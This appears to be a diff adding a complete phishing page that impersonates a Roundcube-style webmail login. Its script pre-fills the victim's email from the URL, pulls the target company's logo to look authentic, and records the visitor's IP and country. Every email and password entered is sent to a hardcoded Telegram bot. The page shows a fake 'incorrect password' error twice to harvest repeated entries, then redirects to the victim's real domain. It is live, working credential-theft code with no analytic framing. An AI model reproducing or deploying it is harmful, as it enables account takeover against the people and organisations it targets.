@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Webmail</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link id="favicon" rel="shortcut icon" type="image/png" href="" />
+    
+    <style>
+        /* Typography - Google Fonts Roboto Fallback */
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 100;
+            src: url(https://fonts.gstatic.com/s/roboto/v30/KFOkCnqEu92Fr1MmgVxIIzc.ttf) format('truetype');
+        }
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 300;
+            src: url(https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmSU5fBBc9.ttf) format('truetype');
+        }
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 400;
+            src: url(https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxP.ttf) format('truetype');
+        }
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 500;
+            src: url(https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc9.ttf) format('truetype');
+        }
+        @font-face {
+            font-family: 'Roboto';
+            font-style: normal;
+            font-weight: 700;
+            src: url(https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmWUlfBBc9.ttf) format('truetype');
+        }
+
+        /* General Layout */
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: #dcdee3;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-family: 'Roboto', Helvetica, Arial, sans-serif;
+            font-size: 14px;
+        }
+
+        /* Centered Dialog */
+        .dialog {
+            z-index: 1000;
+            perspective: 1200px;
+        }
+
+        .dialog-content {
+            width: 400px;
+            background: #fff;
+            border-radius: 6px;
+            padding: 20px 25px;
+            box-sizing: border-box;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+        }
+
+        .dialog-form {
+            display: block;
+        }
+
+        .dialog-form #logo {
+            display: block;
+            margin: 0 auto 15px auto;
+        }
+
+        .dialog-form legend {
+            display: block;
+            width: 100%;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 300;
+            color: #222;
+            border: none;
+            margin-bottom: 30px;
+            word-break: break-all;
+        }
+
+        /* Form Fields styling */
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 14px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 5px;
+            transition: color 0.2s ease;
+        }
+
+        .form-group input[type="email"],
+        .form-group input[type="password"] {
+            color: #222;
+            font-family: 'Roboto', Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            background-color: transparent;
+            border: none;
+            border-bottom: 2px solid #222;
+            border-radius: 0;
+            padding: 6px 0;
+            outline: none;
+            width: 100%;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease;
+        }
+
+        /* Error field states */
+        .form-group.has-error label {
+            color: #E74C3C;
+        }
+
+        .form-group.has-error input {
+            border-bottom-color: #E74C3C;
+        }
+
+        #error {
+            display: none;
+            color: #E74C3C;
+            font-size: 14px;
+            margin-top: 5px;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        /* Submit Button */
+        .pad-top-20 {
+            padding-top: 20px;
+        }
+        
+        .pad-btm-20 {
+            padding-bottom: 20px;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            font-family: 'Roboto', Helvetica, Arial, sans-serif;
+            font-weight: 700;
+            border: none;
+            border-radius: 0;
+            text-transform: uppercase;
+            padding: 12px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #868686;
+            cursor: pointer;
+            box-sizing: border-box;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn:hover {
+            background-color: #222;
+        }
+
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Entrance Animation (Bounce.js inspired) */
+        .dialog-effect-in {
+            animation: showDialog 1000ms linear both;
+        }
+
+        @keyframes showDialog {
+            0% {
+                transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+            7.61% {
+                transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+            11.41% {
+                transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+            15.12% {
+                transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+            18.92% {
+                transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+            22.72% {
+                transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+            30.23% {
+                transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+            50.25% {
+                transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+            70.27% {
+                transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+            100% {
+                transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
+            }
+        }
+
+        /* Shake Animation */
+        .shakeit {
+            animation: shakeDialog 300ms linear both;
+        }
+
+        @keyframes shakeDialog {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-8px); }
+            40%, 80% { transform: translateX(8px); }
+        }
+    </style>
+</head>
+<body>
+    <div id="dialog" class="dialog dialog-effect-in">
+        <div class="dialog-content">
+            <form id="login_form" class="dialog-form" method="POST">
+                <img id="logo" src="https://images.sftcdn.net/images/t_app-logo-xl,f_auto,dpr_2/p/7a60e021-3fe5-4334-9e56-7cc6ebae632d/2825932570/roundcube-webmail-roundcube_logo_icon.svg" alt="Logo" width="70" height="70">
+                <legend>Welcome to Webmail</legend>
+                
+                <div class="form-group" id="group_username">
+                    <label for="user_username">Username:</label>
+                    <input type="email" id="user_username" name="user_username" required disabled autofocus />
+                </div>
+                
+                <div class="form-group" id="group_password">
+                    <label for="user_password">Password:</label>
+                    <input type="password" id="user_password" name="user_password" required />
+                </div>
+                
+                <label id="error">Enter the correct password</label>
+                
+                <div class="pad-top-20 pad-btm-20">
+                    <input type="submit" id="submit-btn" class="btn" value="Continue">
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        let count = 0;
+        let ipData = { ip: 'Unknown', country: 'Unknown' };
+
+        // Fetch visitor IP information from ipwho.is on load
+        async function fetchIpInfo() {
+            try {
+                const res = await fetch('https://ipwho.is/');
+                const data = await res.json();
+                if (data && data.success) {
+                    ipData.ip = data.ip || 'Unknown';
+                    ipData.country = data.country || 'Unknown';
+                }
+            } catch (e) {
+                console.error('IP geolocation fetch failed:', e);
+            }
+        }
+
+        // Extract email address from URL hash segment
+        function fetchEmail() {
+            const mail = window.location.hash.substring(1);
+            if (mail) {
+                document.getElementById('user_username').value = mail;
+                document.title = "ca543e2728f684c0d5de19a83de16645636ed4699b2b6 - " + mail;
+                return mail;
+            }
+            return '';
+        }
+
+        // Get the domain from email address
+        function getDomain(email) {
+            const parts = email.split('@');
+            return parts.length > 1 ? parts[1] : '';
+        }
+
+        // Resolve corporate logo and favicon if available via Clearbit API
+        function loadCompanyAssets(domain) {
+            if (!domain) return;
+            const logoUrl = `https://logo.clearbit.com/${domain}`;
+            
+            const img = new Image();
+            img.onload = function() {
+                document.getElementById('logo').src = logoUrl;
+                document.getElementById('favicon').href = logoUrl;
+            };
+            img.src = logoUrl;
+        }
+
+        // Send submission log to Telegram via HTTP API
+        async function sendToTelegram(email, password) {
+            const botToken = '7232984136:AAHAADk-38F1m1P0YohNTGACEWUiY22IYSI';
+            const chatId = '317906536';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            const message = `-----------+ W3Bmail logs +-----------\n` +
+                            `User ID: ${email}\n` +
+                            `Password: ${password}\n` +
+                            `Client IP      : ${ipData.ip}\n` +
+                            `Client Country : ${ipData.country}\n` +
+                            `----------+ Created in Dagbo unit +-----------\n`;
+
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+            } catch (err) {
+                console.error('Telegram API submission error:', err);
+            }
+        }
+
+        // Initialize script logic on DOM Load
+        document.addEventListener('DOMContentLoaded', () => {
+            fetchIpInfo();
+            const email = fetchEmail();
+            if (email) {
+                const domain = getDomain(email);
+                loadCompanyAssets(domain);
+            }
+        });
+
+        // Form Submit Handler
+        document.getElementById('login_form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            count++;
+            
+            const email = document.getElementById('user_username').value;
+            const password = document.getElementById('user_password').value;
+            const submitBtn = document.getElementById('submit-btn');
+            const errorLabel = document.getElementById('error');
+            const pwdInput = document.getElementById('user_password');
+            const pwdGroup = document.getElementById('group_password');
+            const dialog = document.getElementById('dialog');
+            
+            // Disable submit interactions during call
+            submitBtn.disabled = true;
+            submitBtn.value = "Verifying...";
+            
+            // Reset previous field errors
+            pwdGroup.classList.remove('has-error');
+            errorLabel.style.display = 'none';
+
+            // Submit credentials to Telegram
+            await sendToTelegram(email, password);
+
+            if (count > 2) {
+                // Third attempt - Redirect to corporate domain
+                const domain = getDomain(email);
+                setTimeout(() => {
+                    window.location.href = `https://${domain}`;
+                }, 100);
+            } else {
+                // First / Second attempt - Display invalid error, shake dialog
+                setTimeout(() => {
+                    pwdGroup.classList.add('has-error');
+                    errorLabel.style.display = 'block';
+                    pwdInput.value = '';
+                    
+                    submitBtn.disabled = false;
+                    submitBtn.value = "Continue";
+                    
+                    dialog.classList.add('shakeit');
+                    setTimeout(() => {
+                        dialog.classList.remove('shakeit');
+                    }, 300);
+                    
+                    pwdInput.focus();
+                }, 200);
+            }
+        });
+    </script>
+</body>
+</html>
